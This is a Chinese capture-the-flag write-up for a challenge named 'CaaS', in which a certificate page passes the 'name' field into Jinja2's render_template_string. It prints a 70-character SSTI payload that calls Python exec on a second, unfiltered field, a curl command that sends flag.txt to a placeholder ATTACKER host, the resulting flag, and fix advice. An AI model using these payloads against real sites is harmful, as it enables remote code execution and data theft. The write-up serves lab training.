# CaaS

## 题目简述

证书生成页把经过黑名单检查的 `name` 拼进 `render_template_string`，形成 Jinja2 SSTI。`name` 限长 70 字符，但未过滤的 `team_name` 仍可通过 `request.values` 访问，适合承载长命令。

## 解题过程

在 `name` 字段放入恰好 70 字符的短跳板：

```jinja2
{{request.application.__builtins__.exec(request.values["team_name"])}}
```

它从当前请求取出 `team_name`，交给 Python `exec`。黑名单只检查 `name`，所以第二个字段可以写完整命令，例如：

```python
import os;os.system("curl https://ATTACKER/ -d @flag.txt")
```

在自有接收端查看 POST 内容，得到：

```text
n00bz{5571_57r1k3s_4g41n_7a1b3f4e5d}
```

## 方法总结

限制主字段长度并不能保护模板渲染；模板上下文能访问同一请求中的其他字段，攻击者可把短表达式当作跳板。修复应取消动态模板源码，并对所有输入采用一致的结构化校验。
